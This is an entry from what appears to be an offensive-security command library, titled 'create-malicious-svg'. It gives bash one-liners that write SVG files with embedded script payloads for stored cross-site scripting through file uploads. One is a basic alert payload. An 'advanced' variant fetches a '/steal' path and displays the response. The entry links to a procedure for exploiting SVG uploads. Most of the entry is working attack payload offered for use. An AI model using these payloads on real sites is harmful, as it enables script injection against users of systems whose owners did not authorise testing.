---
data: >-
  echo '<svg
  xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>' >
  malicious.svg
tags:
  - xss
  - file-creation
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9924f2f5-ceac-4004-ac7f-1915e8d9e166
created_at: '2025-12-13T23:56:20.153Z'
updated_at: '2025-12-13T23:56:20.153Z'
verified: false
validated: true
submitted: true
---
# create-malicious-svg

## Command

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>' > malicious.svg
```

## Description

This command creates an SVG file containing an embedded XSS payload, useful for testing or exploiting stored XSS vulnerabilities via file uploads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` content | The SVG XML with script tag | Yes |
| `> malicious.svg` | Output file name | Yes |

## Examples

### Basic Usage

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>' > malicious.svg
```

### Advanced Usage

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("/steal").then(r => r.text()).then(t => alert(t))</script></svg>' > advanced.svg
```

## Expected Output

A file named malicious.svg is created with the XSS payload.

## Related

- [[commands/upload-svg-file]]
- [[procedures/Exploit-Stored-XSS-via-SVG-Upload]]
